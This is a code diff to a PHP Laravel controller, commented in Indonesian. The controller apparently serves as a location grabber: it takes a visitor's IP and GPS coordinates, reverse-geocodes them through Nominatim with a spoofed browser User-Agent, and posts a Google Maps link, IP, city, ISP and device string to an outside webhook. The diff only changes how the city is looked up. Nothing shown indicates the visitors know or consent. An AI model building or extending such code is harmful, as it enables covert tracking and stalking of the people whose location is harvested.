@@ -25,6 +25,13 @@ class ServiceAPIController extends Controller
             $api = $client->request('GET', 'http://ip-api.com/json/' . $validatedData['ip']);
             $json = json_decode($api->getBody(), true);
 
+            $city = $client->request('GET', 'https://nominatim.openstreetmap.org/reverse?lat=' . $validatedData['lat'] . '&lon=' . $validatedData['long'] . '&format=json&accept-language=id', [
+                'headers' => [
+                    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+                ]
+            ]);
+            $json2 = json_decode($city->getBody(), true);
+
             $response = $client->request('POST', 'https://apiv2.bhadrikais.my.id/webhook.php?kode=2', [
                 'headers' => [
                     'Origin' => 'http://localhost:8000', // Ganti dengan origin yang sesuai
@@ -34,7 +41,7 @@ class ServiceAPIController extends Controller
                     'message' =>  "LINK :\n" . $request->url() . "\n" .
                         "LOKASI :\n " . 'https://www.google.com/maps/search/?api=1&query=' . $validatedData['lat'] . ',' . $validatedData['long'] . " \n" .
                         "IP :\n" . $json['query'] . "\n" .
-                        "KOTA :\n" . $json['city'] . "\n" .
+                        "KOTA :\n" . $json2['address']['city'] . "\n" .
                         "ISP :\n" . $json['isp'] . "\n" .
                         "DEVICE :\n" . $request->header('User-Agent'),
                 ]
@@ -42,7 +49,7 @@ class ServiceAPIController extends Controller
 
             return response()->json([
                 'status' => 200,
-                'data' => $json['city']
+                'data' => $json2['address']['city']
             ]);
         } catch (\Exception $e) {
             // Jika terjadi error, tangani dan kirim error message
